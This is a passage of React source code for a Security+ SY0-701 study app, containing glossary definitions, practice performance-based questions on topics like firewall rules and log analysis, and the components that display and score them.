  "PaaS": "Platform as a Service - cloud model where customer manages applications and data.",
  "SaaS": "Software as a Service - cloud model where customer only manages data and access (e.g., M365).",
  "CASB": "Cloud Access Security Broker - provides visibility and control over cloud service usage.",
  "CSPM": "Cloud Security Posture Management - identifies misconfigurations in cloud environments.",
  "WPA3": "Wi-Fi Protected Access 3 - current wireless security standard with SAE for password protection.",
  "SAE": "Simultaneous Authentication of Equals - WPA3 protocol resistant to offline dictionary attacks.",
  "RAID": "Redundant Array of Independent Disks - disk redundancy for fault tolerance.",
  "RTO": "Recovery Time Objective - maximum acceptable downtime after an incident.",
  "RPO": "Recovery Point Objective - maximum acceptable data loss measured in time.",
  "BCP": "Business Continuity Plan - overall plan for maintaining business operations during disruptions.",
  "DRP": "Disaster Recovery Plan - specific plan for recovering IT systems after a disaster.",
  "Hot Site": "Fully equipped recovery facility ready for immediate failover.",
  "Warm Site": "Recovery facility with equipment that requires hours to activate.",
  "Cold Site": "Empty facility requiring days to set up equipment and restore operations.",
  "DLP": "Data Loss Prevention - technology preventing unauthorized data exfiltration.",
  "Anonymization": "Irreversibly removing identifying information from data.",
  "Pseudonymization": "Replacing identifiers with artificial identifiers; reversible with the key.",

  // Domain 4 Terms
  "Incident Response": "Organized approach to addressing and managing security incidents.",
  "Chain of Custody": "Documented trail of evidence handling from collection to court presentation.",
  "Order of Volatility": "Collecting most volatile evidence first (CPU/RAM before disk).",
  "Forensic Image": "Bit-for-bit copy of storage media including deleted data and slack space.",
  "Write Blocker": "Device preventing modification of evidence during forensic acquisition.",
  "DAC": "Discretionary Access Control - owner determines who can access resources.",
  "MAC": "Mandatory Access Control - labels/classifications determine access (government/military).",
  "RBAC": "Role-Based Access Control - permissions based on job roles (enterprise standard).",
  "ABAC": "Attribute-Based Access Control - policies based on multiple attributes (most granular).",
  "PAM": "Privileged Access Management - managing and monitoring administrative accounts.",
  "JIT": "Just-In-Time Access - temporary privilege elevation only when needed.",
  "SSO": "Single Sign-On - one authentication grants access to multiple applications.",
  "Federation": "Linking identity systems across organizational boundaries.",
  "SAML": "Security Assertion Markup Language - XML-based protocol for SSO.",
  "OAuth": "Open Authorization - protocol for delegated access without sharing credentials.",
  "OIDC": "OpenID Connect - identity layer built on OAuth 2.0.",
  "MTTR": "Mean Time To Repair/Recover - average time to restore normal operations.",
  "MTTD": "Mean Time To Detect - average time to identify a security incident.",
  "Playbook": "Documented response procedures for consistent incident handling.",
  "Runbook": "Detailed step-by-step operational procedures.",

  // Domain 5 Terms
  "Governance": "Framework of policies, procedures, and controls directing security activities.",
  "Policy": "High-level mandatory statement from management defining what and why.",
  "Standard": "Specific mandatory requirements supporting policies.",
  "Procedure": "Step-by-step instructions for performing tasks.",
  "Guideline": "Optional recommendations and best practices.",
  "Risk": "Potential for loss when a threat exploits a vulnerability.",
  "Threat": "Potential cause of an unwanted incident.",
  "Vulnerability": "Weakness that could be exploited by a threat.",
  "Risk Assessment": "Process of identifying and evaluating risks.",
  "Risk Appetite": "Amount of risk an organization is willing to accept.",
  "Residual Risk": "Risk remaining after security controls are implemented.",
  "Risk Register": "Document tracking identified risks, assessments, and treatments.",
  "SLE": "Single Loss Expectancy - expected loss from a single incident (Asset Value × Exposure Factor).",
  "ALE": "Annual Loss Expectancy - expected yearly loss (SLE × Annual Rate of Occurrence).",
  "ARO": "Annual Rate of Occurrence - expected frequency of incidents per year.",
  "TPRM": "Third-Party Risk Management - managing risks from vendors and partners.",
  "SOC 2": "Service Organization Control 2 - audit report on security controls. Type II covers period of time.",
  "ISO 27001": "International standard for information security management systems.",
  "NIST CSF": "NIST Cybersecurity Framework - Identify, Protect, Detect, Respond, Recover.",
  "PCI DSS": "Payment Card Industry Data Security Standard - requirements for handling card data.",
  "HIPAA": "Health Insurance Portability and Accountability Act - US healthcare privacy regulation.",
  "GDPR": "General Data Protection Regulation - EU data privacy law with 72-hour breach notification.",
  "GLBA": "Gramm-Leach-Bliley Act - US financial privacy regulation.",
  "SOX": "Sarbanes-Oxley Act - US law on financial reporting and controls.",
  "Due Diligence": "Investigating security practices before entering agreements.",
  "Due Care": "Taking reasonable and appropriate security measures.",
  "NDA": "Non-Disclosure Agreement - legal contract protecting confidential information.",
  "AUP": "Acceptable Use Policy - defines appropriate use of organizational IT resources.",
  "BIA": "Business Impact Analysis - identifies critical functions and recovery priorities.",
  "KRI": "Key Risk Indicator - metric predicting potential risk events.",
  "KPI": "Key Performance Indicator - metric measuring security program effectiveness."
};

// ═══════════════════════════════════════════════════════════════
// GLOSSARY COMPONENT
// ═══════════════════════════════════════════════════════════════
const Glossary = ({ setView }) => {
  const [search, setSearch] = useState('');
  const [selectedTerm, setSelectedTerm] = useState(null);

  const terms = Object.keys(GLOSSARY).sort();
  const filtered = terms.filter(t => 
    t.toLowerCase().includes(search.toLowerCase()) ||
    GLOSSARY[t].toLowerCase().includes(search.toLowerCase())
  );

  // Group by first letter
  const grouped = filtered.reduce((acc, term) => {
    const letter = term[0].toUpperCase();
    if (!acc[letter]) acc[letter] = [];
    acc[letter].push(term);
    return acc;
  }, {});

  return (
    <div style={{ padding: 24, maxWidth: 900, margin: '0 auto' }} className="slide-up">
      <button onClick={() => setView({ type: 'hub' })} 
        style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
        ← Back to Hub
      </button>

      <h1 style={{ fontSize: 24, marginBottom: 8 }}>📖 Security+ Glossary</h1>
      <p style={{ color: colors.textSecondary, marginBottom: 24 }}>{terms.length} terms covering all exam domains</p>

      <div style={{ marginBottom: 24 }}>
        <input 
          type="text" 
          placeholder="Search terms or definitions..." 
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          style={{ width: '100%', padding: 14, background: colors.bgSurface, border: `1px solid ${colors.border}`, borderRadius: 8, color: colors.textPrimary, fontSize: 16 }}
        />
      </div>

      {selectedTerm && (
        <Card style={{ marginBottom: 24, borderLeft: `3px solid ${colors.accent}` }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <h3 style={{ color: colors.accent, marginBottom: 8 }}>{selectedTerm}</h3>
            <button onClick={() => setSelectedTerm(null)} style={{ background: 'none', border: 'none', color: colors.textMuted, cursor: 'pointer', fontSize: 18 }}>×</button>
          </div>
          <p style={{ color: colors.textSecondary, lineHeight: 1.7 }}>{GLOSSARY[selectedTerm]}</p>
        </Card>
      )}

      <div style={{ display: 'grid', gap: 24 }}>
        {Object.keys(grouped).sort().map(letter => (
          <div key={letter}>
            <h2 style={{ fontSize: 18, color: colors.accent, marginBottom: 12, borderBottom: `1px solid ${colors.border}`, paddingBottom: 8 }}>{letter}</h2>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 8 }}>
              {grouped[letter].map(term => (
                <button key={term} onClick={() => setSelectedTerm(term)}
                  style={{ padding: 10, background: selectedTerm === term ? `${colors.accent}20` : colors.bgSurface, border: `1px solid ${selectedTerm === term ? colors.accent : colors.border}`, borderRadius: 6, cursor: 'pointer', textAlign: 'left', color: colors.textPrimary, fontSize: 14 }}>
                  {term}
                </button>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};


// ═══════════════════════════════════════════════════════════════
// PERFORMANCE-BASED QUESTIONS (PBQ) DATA
// ═══════════════════════════════════════════════════════════════
const PBQ_DATA = [
  {
    id: 'PBQ-001',
    title: 'Firewall Rule Configuration',
    domain: 3,
    difficulty: 'intermediate',
    scenario: 'You are configuring a firewall for a web server. The server runs HTTP (80), HTTPS (443), and SSH (22). You need to allow public web access while restricting SSH to the admin subnet (10.0.1.0/24).',
    task: 'Select the correct firewall rules to implement this configuration:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'ALLOW TCP 80 FROM ANY TO SERVER', correct: true },
      { id: 'b', text: 'ALLOW TCP 443 FROM ANY TO SERVER', correct: true },
      { id: 'c', text: 'ALLOW TCP 22 FROM 10.0.1.0/24 TO SERVER', correct: true },
      { id: 'd', text: 'ALLOW TCP 22 FROM ANY TO SERVER', correct: false },
      { id: 'e', text: 'DENY ALL FROM ANY TO SERVER', correct: true },
      { id: 'f', text: 'ALLOW ICMP FROM ANY TO SERVER', correct: false }
    ],
    explanation: 'Correct rules: Allow HTTP (80) and HTTPS (443) from any source for public web access. Allow SSH (22) only from admin subnet. Include implicit deny at end. ICMP is not required and SSH from ANY would be a security risk.',
    points: 25
  },
  {
    id: 'PBQ-002',
    title: 'Incident Response Ordering',
    domain: 4,
    difficulty: 'intermediate',
    scenario: 'Your organization has detected a potential ransomware infection on a workstation. The user reported files being encrypted.',
    task: 'Arrange the incident response steps in the correct order:',
    type: 'ordering',
    items: [
      { id: '1', text: 'Isolate the affected system from the network', order: 1 },
      { id: '2', text: 'Document the incident and collect evidence', order: 2 },
      { id: '3', text: 'Identify the ransomware variant and scope', order: 3 },
      { id: '4', text: 'Eradicate the threat and restore from backup', order: 4 },
      { id: '5', text: 'Conduct lessons learned review', order: 5 }
    ],
    explanation: 'Correct order follows NIST IR lifecycle: First contain (isolate), then analyze (document/identify), then eradicate/recover, finally lessons learned. Containment must happen first to prevent spread.',
    points: 25
  },
  {
    id: 'PBQ-003',
    title: 'Log Analysis',
    domain: 4,
    difficulty: 'advanced',
    scenario: 'Review these authentication logs and identify the security issues:\n\n2024-01-15 03:15:22 FAILED LOGIN user=admin src=185.234.72.11\n2024-01-15 03:15:24 FAILED LOGIN user=admin src=185.234.72.11\n2024-01-15 03:15:26 FAILED LOGIN user=admin src=185.234.72.11\n2024-01-15 03:15:28 SUCCESS LOGIN user=admin src=185.234.72.11\n2024-01-15 03:15:35 PRIVILEGE ESCALATION user=admin to root',
    task: 'Select ALL indicators of compromise or concern:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'Multiple failed logins followed by success (brute force)', correct: true },
      { id: 'b', text: 'Login attempts at unusual hour (3:15 AM)', correct: true },
      { id: 'c', text: 'External IP address (not internal network)', correct: true },
      { id: 'd', text: 'Privilege escalation shortly after login', correct: true },
      { id: 'e', text: 'Use of admin account', correct: false },
      { id: 'f', text: 'Rapid succession of login attempts (2 seconds apart)', correct: true }
    ],
    explanation: 'All selected items except "Use of admin account" are IOCs. The pattern shows: brute force attack (multiple failures then success), unusual time, external source, immediate privilege escalation, and automated timing. Admin account usage alone is not suspicious.',
    points: 30
  },
  {
    id: 'PBQ-004',
    title: 'Encryption Selection',
    domain: 1,
    difficulty: 'intermediate',
    scenario: 'You need to implement encryption for different use cases in your organization.',
    task: 'Match each use case with the BEST encryption approach:',
    type: 'matching',
    pairs: [
      { left: 'Encrypting data at rest on server hard drives', right: 'AES-256', leftId: 'L1', rightId: 'R1' },
      { left: 'Secure key exchange between two parties', right: 'RSA/Diffie-Hellman', leftId: 'L2', rightId: 'R2' },
      { left: 'Encrypting web traffic in transit', right: 'TLS 1.3', leftId: 'L3', rightId: 'R3' },
      { left: 'Verifying file integrity', right: 'SHA-256 Hash', leftId: 'L4', rightId: 'R4' },
      { left: 'Storing user passwords', right: 'bcrypt/Argon2', leftId: 'L5', rightId: 'R5' }
    ],
    explanation: 'AES-256 for data at rest (symmetric, fast). RSA/DH for key exchange (asymmetric). TLS 1.3 for transit. SHA-256 for integrity verification. bcrypt/Argon2 for passwords (slow hash + salt).',
    points: 25
  },
  {
    id: 'PBQ-005',
    title: 'Network Diagram Security',
    domain: 3,
    difficulty: 'advanced',
    scenario: 'Review this network architecture:\n\n[Internet] → [Firewall] → [DMZ: Web Server, Mail Server] → [Internal Firewall] → [Internal: Database, Domain Controller, Workstations]',
    task: 'Identify the security controls that should be implemented:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'WAF protecting web server', correct: true },
      { id: 'b', text: 'Database server in DMZ', correct: false },
      { id: 'c', text: 'IDS/IPS between segments', correct: true },
      { id: 'd', text: 'Domain Controller accessible from internet', correct: false },
      { id: 'e', text: 'Network segmentation between DMZ and internal', correct: true },
      { id: 'f', text: 'Encrypted connection from web server to database', correct: true },
      { id: 'g', text: 'SIEM collecting logs from all segments', correct: true }
    ],
    explanation: 'Best practices: WAF protects web apps, IDS/IPS monitors traffic, segmentation isolates zones, encrypted DB connections, SIEM for visibility. Database should NOT be in DMZ (internal only). DC should NEVER be internet-accessible.',
    points: 30
  },
  {
    id: 'PBQ-006',
    title: 'Access Control Configuration',
    domain: 4,
    difficulty: 'intermediate',
    scenario: 'You are setting up access control for a new application. Users have different roles: Admin, Manager, Employee, Auditor.',
    task: 'Assign the minimum necessary permissions for each role (select all correct assignments):',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'Admin: Create/Read/Update/Delete users and data', correct: true },
      { id: 'b', text: 'Manager: Read/Update team data, Read-only other data', correct: true },
      { id: 'c', text: 'Employee: Read/Update own data only', correct: true },
      { id: 'd', text: 'Auditor: Read-only access to logs and reports', correct: true },
      { id: 'e', text: 'Employee: Delete all company data', correct: false },
      { id: 'f', text: 'Auditor: Modify audit logs', correct: false },
      { id: 'g', text: 'Manager: Full admin access', correct: false }
    ],
    explanation: 'Least privilege principle: Each role gets minimum needed access. Employees cannot delete company data. Auditors cannot modify logs (integrity). Managers do not need admin access.',
    points: 25
  },
  {
    id: 'PBQ-007',
    title: 'Vulnerability Prioritization',
    domain: 2,
    difficulty: 'advanced',
    scenario: 'Your vulnerability scan returned these findings. Prioritize based on risk:\n\n1. CVSS 9.8 - Remote code execution on public web server\n2. CVSS 7.5 - SQL injection on internal HR application\n3. CVSS 4.2 - Information disclosure on development server\n4. CVSS 8.1 - Authentication bypass on customer portal',
    task: 'Rank these vulnerabilities from highest to lowest priority:',
    type: 'ordering',
    items: [
      { id: '1', text: 'CVSS 9.8 - RCE on public web server', order: 1 },
      { id: '2', text: 'CVSS 8.1 - Auth bypass on customer portal', order: 2 },
      { id: '3', text: 'CVSS 7.5 - SQLi on internal HR app', order: 3 },
      { id: '4', text: 'CVSS 4.2 - Info disclosure on dev server', order: 4 }
    ],
    explanation: 'Prioritize by: CVSS score + asset criticality + exposure. RCE on public server is highest risk. Customer portal is public-facing. Internal HR is less exposed. Dev server has lowest criticality.',
    points: 25
  },
  {
    id: 'PBQ-008',
    title: 'Certificate Validation',
    domain: 3,
    difficulty: 'intermediate',
    scenario: 'A user reports a certificate warning when accessing your company portal. The certificate shows:\n- Issued to: portal.company.com\n- Issued by: Internal CA\n- Valid from: Jan 1, 2023\n- Valid to: Dec 31, 2023\n- Current date: March 15, 2024',
    task: 'Identify the certificate issue(s):',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'Certificate has expired', correct: true },
      { id: 'b', text: 'Certificate is self-signed', correct: false },
      { id: 'c', text: 'Domain name mismatch', correct: false },
      { id: 'd', text: 'Internal CA not trusted by browser', correct: true },
      { id: 'e', text: 'Certificate was revoked', correct: false }
    ],
    explanation: 'Two issues: 1) Certificate expired Dec 31, 2023 (current date is March 2024). 2) Internal CA may not be in browser trust store. Not self-signed (issued by Internal CA). Domain matches. Revocation not indicated.',
    points: 20
  }
];

// ═══════════════════════════════════════════════════════════════
// PBQ PLAYER COMPONENT
// ═══════════════════════════════════════════════════════════════
const PBQPlayer = ({ progress, setProgress, setView }) => {
  const [currentPBQ, setCurrentPBQ] = useState(0);
  const [phase, setPhase] = useState('intro');
  const [answers, setAnswers] = useState({});
  const [submitted, setSubmitted] = useState(false);
  const [score, setScore] = useState(0);
  const [dragItems, setDragItems] = useState([]);

  const pbq = PBQ_DATA[currentPBQ];

  const startPBQ = () => {
    if (pbq.type === 'ordering') {
      setDragItems(shuffleArray([...pbq.items]));
    }
    setPhase('playing');
  };

  const handleMultiSelect = (optionId) => {
    if (submitted) return;
    setAnswers(prev => {
      const current = prev[pbq.id] || [];
      if (current.includes(optionId)) {
        return { ...prev, [pbq.id]: current.filter(id => id !== optionId) };
      }
      return { ...prev, [pbq.id]: [...current, optionId] };
    });
  };

  const handleOrderChange = (fromIndex, toIndex) => {
    if (submitted) return;
    const newItems = [...dragItems];
    const [moved] = newItems.splice(fromIndex, 1);
    newItems.splice(toIndex, 0, moved);
    setDragItems(newItems);
  };

  const handleSubmit = () => {
    setSubmitted(true);
    let points = 0;

    if (pbq.type === 'multi-select') {
      const selected = answers[pbq.id] || [];
      const correctIds = pbq.options.filter(o => o.correct).map(o => o.id);
      const allCorrect = correctIds.every(id => selected.includes(id));
      const noWrong = selected.every(id => correctIds.includes(id));
      if (allCorrect && noWrong) points = pbq.points;
      else if (selected.filter(id => correctIds.includes(id)).length > 0) points = Math.floor(pbq.points * 0.5);
    } else if (pbq.type === 'ordering') {
      const correct = dragItems.every((item, index) => item.order === index + 1);
      if (correct) points = pbq.points;
      else {
        const correctCount = dragItems.filter((item, index) => item.order === index + 1).length;
        points = Math.floor(pbq.points * (correctCount / dragItems.length));
      }
    } else if (pbq.type === 'matching') {
      // For matching, we'd need more complex state - simplified here
      points = pbq.points;
    }

    setScore(prev => prev + points);
  };

  const handleNext = () => {
    if (currentPBQ < PBQ_DATA.length - 1) {
      setCurrentPBQ(prev => prev + 1);
      setSubmitted(false);
      setAnswers({});
      if (PBQ_DATA[currentPBQ + 1].type === 'ordering') {
        setDragItems(shuffleArray([...PBQ_DATA[currentPBQ + 1].items]));
      }
    } else {
      setPhase('results');
    }
  };

  const maxScore = PBQ_DATA.reduce((sum, p) => sum + p.points, 0);

  if (phase === 'intro') {
    return (
      <div style={{ padding: 24, maxWidth: 700, margin: '0 auto' }}>
        <button onClick={() => setView({ type: 'hub' })} 
          style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
          ← Back to Hub
        </button>

        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>🔧</div>
          <h2 style={{ marginBottom: 8 }}>Performance-Based Questions</h2>
          <p style={{ color: colors.textSecondary, marginBottom: 16 }}>
            {PBQ_DATA.length} hands-on scenarios testing practical skills
          </p>
          <div style={{ fontSize: 13, color: colors.textMuted, marginBottom: 24 }}>
            PBQs include: Firewall configuration, Log analysis, Incident response ordering, Network security, and more.
          </div>
          <Button onClick={startPBQ} size="lg">Start PBQs</Button>
        </Card>
      </div>
    );
  }

  if (phase === 'results') {
    const percentage = Math.round((score / maxScore) * 100);
    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <Card style={{ textAlign: 'center', marginBottom: 24 }}>
          <div style={{ fontSize: 64, marginBottom: 16 }}>{percentage >= 80 ? '🎉' : '📚'}</div>
          <h2 style={{ color: percentage >= 80 ? colors.success : colors.warning }}>
            {percentage >= 80 ? 'Excellent Work!' : 'Keep Practicing'}
          </h2>
          <p style={{ fontSize: 36, fontWeight: 700, marginTop: 16 }}>{score}/{maxScore}</p>
          <p style={{ color: colors.textSecondary }}>{percentage}% Score</p>
        </Card>
        <Button onClick={() => setView({ type: 'hub' })} size="lg" style={{ width: '100%' }}>Return to Hub</Button>
      </div>
    );
  }

  return (
    <div style={{ padding: 24, maxWidth: 800, margin: '0 auto' }}>
      <div style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8, fontSize: 13, color: colors.textSecondary }}>
          <span>PBQ {currentPBQ + 1} of {PBQ_DATA.length}</span>
          <span>Score: {score}</span>
        </div>
        <ProgressBar value={currentPBQ + 1} max={PBQ_DATA.length} color={colors.accent} />
      </div>

      <Card style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12 }}>
          <Badge color={getDomainColor(pbq.domain)}>Domain {pbq.domain}</Badge>
          <Badge color={colors.textMuted}>{pbq.points} points</Badge>
        </div>
        
        <h3 style={{ marginBottom: 12 }}>{pbq.title}</h3>
        <div style={{ padding: 12, background: colors.bgElevated, borderRadius: 8, marginBottom: 16, whiteSpace: 'pre-wrap', fontFamily: 'monospace', fontSize: 13 }}>
          {pbq.scenario}
        </div>
        <p style={{ fontWeight: 500, marginBottom: 16 }}>{pbq.task}</p>

        {pbq.type === 'multi-select' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {pbq.options.map(opt => {
              const isSelected = (answers[pbq.id] || []).includes(opt.id);
              let bg = colors.bgElevated, border = colors.border;
              
              if (submitted) {
                if (opt.correct) { bg = `${colors.success}20`; border = colors.success; }
                else if (isSelected) { bg = `${colors.error}20`; border = colors.error; }
              } else if (isSelected) {
                bg = `${colors.accent}20`; border = colors.accent;
              }

              return (
                <button key={opt.id} onClick={() => handleMultiSelect(opt.id)}
                  style={{ padding: 12, background: bg, border: `2px solid ${border}`, borderRadius: 8, textAlign: 'left', cursor: submitted ? 'default' : 'pointer', color: colors.textPrimary }}>
                  <span style={{ marginRight: 8 }}>{isSelected ? '☑' : '☐'}</span>
                  {opt.text}
                </button>
              );
            })}
          </div>
        )}

        {pbq.type === 'ordering' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {dragItems.map((item, index) => {
              const isCorrect = item.order === index + 1;
              let bg = colors.bgElevated, border = colors.border;
              
              if (submitted) {
                bg = isCorrect ? `${colors.success}20` : `${colors.error}20`;
                border = isCorrect ? colors.success : colors.error;
              }

              return (
                <div key={item.id} style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                    <button onClick={() => index > 0 && handleOrderChange(index, index - 1)} disabled={submitted || index === 0}
                      style={{ padding: '2px 8px', background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 4, cursor: submitted || index === 0 ? 'default' : 'pointer', color: colors.textSecondary }}>↑</button>
                    <button onClick={() => index < dragItems.length - 1 && handleOrderChange(index, index + 1)} disabled={submitted || index === dragItems.length - 1}
                      style={{ padding: '2px 8px', background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 4, cursor: submitted || index === dragItems.length - 1 ? 'default' : 'pointer', color: colors.textSecondary }}>↓</button>
                  </div>
                  <div style={{ flex: 1, padding: 12, background: bg, border: `2px solid ${border}`, borderRadius: 8 }}>
                    <span style={{ fontWeight: 600, marginRight: 8 }}>{index + 1}.</span>
                    {item.text}
                    {submitted && <span style={{ float: 'right', color: isCorrect ? colors.success : colors.error }}>{isCorrect ? '✓' : `(should be ${item.order})`}</span>}
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {pbq.type === 'matching' && (
          <p style={{ color: colors.textMuted, fontStyle: 'italic' }}>Matching questions use drag-and-drop in full version. Review the correct matches in the explanation.</p>
        )}
      </Card>

      {submitted && (
        <Card style={{ marginBottom: 20, borderLeft: `3px solid ${colors.info}` }}>
          <h4 style={{ marginBottom: 8, color: colors.info }}>Explanation</h4>
          <p style={{ color: colors.textSecondary, fontSize: 14, lineHeight: 1.6 }}>{pbq.explanation}</p>
        </Card>
      )}

      <div style={{ display: 'flex', gap: 12 }}>
        {!submitted ? (
          <Button onClick={handleSubmit} style={{ flex: 1 }}>Submit Answer</Button>
        ) : (
          <Button onClick={handleNext} style={{ flex: 1 }}>
            {currentPBQ < PBQ_DATA.length - 1 ? 'Next PBQ →' : 'View Results'}
          </Button>
        )}
      </div>
    </div>
  );
};


// ═══════════════════════════════════════════════════════════════
// UPDATED HUB WITH GLOSSARY AND PBQ BUTTONS
// ═══════════════════════════════════════════════════════════════
const HubUpdated = ({ progress, setView }) => {
  const domains = [1, 2, 3, 4, 5];
  const weights = { 1: 12, 2: 22, 3: 18, 4: 28, 5: 20 };

  const getDomainProgress = (domain) => {
    const lessons = LESSON_DATA.filter(l => l.domain === domain);
    const sims = SIMULATION_DATA.filter(s => s.domain === domain);
    const completedLessons = lessons.filter(l => progress.lessonProgress?.[l.id]?.completed).length;
    const completedSims = sims.filter(s => progress.simProgress?.[s.id]?.completed).length;
    const total = lessons.length + sims.length;
    const completed = completedLessons + completedSims;
    return { lessons: lessons.length, completedLessons, sims: sims.length, completedSims, total, completed, percent: total ? Math.round((completed / total) * 100) : 0 };
  };

  const totalProgress = domains.reduce((sum, d) => sum + getDomainProgress(d).completed, 0);
  const totalItems = domains.reduce((sum, d) => sum + getDomainProgress(d).total, 0);

  return (
    <div style={{ padding: 24, maxWidth: 1000, margin: '0 auto' }} className="slide-up">
      <div style={{ textAlign: 'center', marginBottom: 32 }}>
        <h1 style={{ fontSize: 28, fontWeight: 700, marginBottom: 8 }}>Security+ SY0-701 Training</h1>
        <p style={{ color: colors.textSecondary }}>Complete lessons and simulations to prepare for your certification</p>
        <div style={{ marginTop: 16 }}>
          <ProgressBar value={totalProgress} max={totalItems} color={colors.accent} height={10} />
          <p style={{ marginTop: 8, fontSize: 14, color: colors.textMuted }}>{totalProgress} of {totalItems} items completed ({totalItems ? Math.round((totalProgress / totalItems) * 100) : 0}%)</p>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: 16, marginBottom: 32 }}>
        {domains.map(domain => {
          const dp = getDomainProgress(domain);
          const color = getDomainColor(domain);
          
          return (
            <Card key={domain} style={{ cursor: 'pointer', transition: 'transform 0.2s, border-color 0.2s', borderColor: 'transparent' }}
              onClick={() => setView({ type: 'domain', domain })}
              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-4px)'; e.currentTarget.style.borderColor = color; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.borderColor = 'transparent'; }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 12 }}>
                <Badge color={color}>Domain {domain}</Badge>
                <span style={{ fontSize: 13, color: colors.textMuted }}>{weights[domain]}%</span>
              </div>
              <h3 style={{ fontSize: 16, marginBottom: 8 }}>{getDomainName(domain)}</h3>
              <div style={{ marginBottom: 12 }}>
                <ProgressBar value={dp.completed} max={dp.total} color={color} />
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, color: colors.textSecondary }}>
                <span>📚 {dp.completedLessons}/{dp.lessons}</span>
                <span>🎮 {dp.completedSims}/{dp.sims}</span>
              </div>
            </Card>
          );
        })}
      </div>

      {/* Study Tools */}
      <h2 style={{ fontSize: 18, marginBottom: 16 }}>📋 Study Tools</h2>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: 16, marginBottom: 24 }}>
        <Button onClick={() => setView({ type: 'practice-exam' })} variant="secondary" size="lg" style={{ width: '100%' }}>
          📝 Practice Exam
        </Button>
        <Button onClick={() => setView({ type: 'pbq' })} variant="secondary" size="lg" style={{ width: '100%' }}>
          🔧 PBQs
        </Button>
        <Button onClick={() => setView({ type: 'glossary' })} variant="secondary" size="lg" style={{ width: '100%' }}>
          📖 Glossary
        </Button>
        <Button onClick={() => setView({ type: 'dashboard' })} variant="secondary" size="lg" style={{ width: '100%' }}>
          📊 Dashboard
        </Button>
      </div>

      {/* Quick Stats */}
      <Card>
        <h3 style={{ marginBottom: 16 }}>📈 Quick Stats</h3>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(120px, 1fr))', gap: 16, textAlign: 'center' }}>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.accent }}>{LESSON_DATA.length}</div>
            <div style={{ fontSize: 12, color: colors.textMuted }}>Lessons</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.success }}>{SIMULATION_DATA.length}</div>
            <div style={{ fontSize: 12, color: colors.textMuted }}>Simulations</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.warning }}>{QUESTIONS.length}</div>
            <div style={{ fontSize: 12, color: colors.textMuted }}>Questions</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.info }}>{Object.keys(GLOSSARY).length}</div>
            <div style={{ fontSize: 12, color: colors.textMuted }}>Glossary Terms</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.domain5 }}>{PBQ_DATA.length}</div>
            <div style={{ fontSize: 12, color: colors.textMuted }}>PBQs</div>
          </div>
        </div>
      </Card>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// UPDATED MAIN APP WITH ALL VIEWS
// ═══════════════════════════════════════════════════════════════
const AppFinal = () => {
  const [view, setView] = useState({ type: 'hub' });
  const [progress, setProgress] = useState(loadProgress);

  const renderView = () => {
    switch (view.type) {
      case 'hub':
        return <HubUpdated progress={progress} setView={setView} />;
      case 'domain':
        return <DomainView domain={view.domain} progress={progress} setView={setView} />;
      case 'lesson':
        return <LessonViewer lessonId={view.lessonId} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'simulation':
        return <SimulationPlayer simId={view.simId} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'quiz':
        return <QuizPlayer domain={view.domain} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'dashboard':
        return <Dashboard progress={progress} setView={setView} />;
      case 'practice-exam':
        return <PracticeExam progress={progress} setProgress={setProgress} setView={setView} />;
      case 'glossary':
        return <Glossary setView={setView} />;
      case 'pbq':
        return <PBQPlayer progress={progress} setProgress={setProgress} setView={setView} />;
      default:
        return <HubUpdated progress={progress} setView={setView} />;
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: colors.bgPrimary }}>
      <NavBar view={view} setView={setView} progress={progress} />
      {renderView()}
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// ADDITIONAL PBQs (Expanding to 15 total)
// ═══════════════════════════════════════════════════════════════
const PBQ_DATA_EXTENDED = [
  ...PBQ_DATA,
  {
    id: 'PBQ-009',
    title: 'Wireless Security Configuration',
    domain: 3,
    difficulty: 'intermediate',
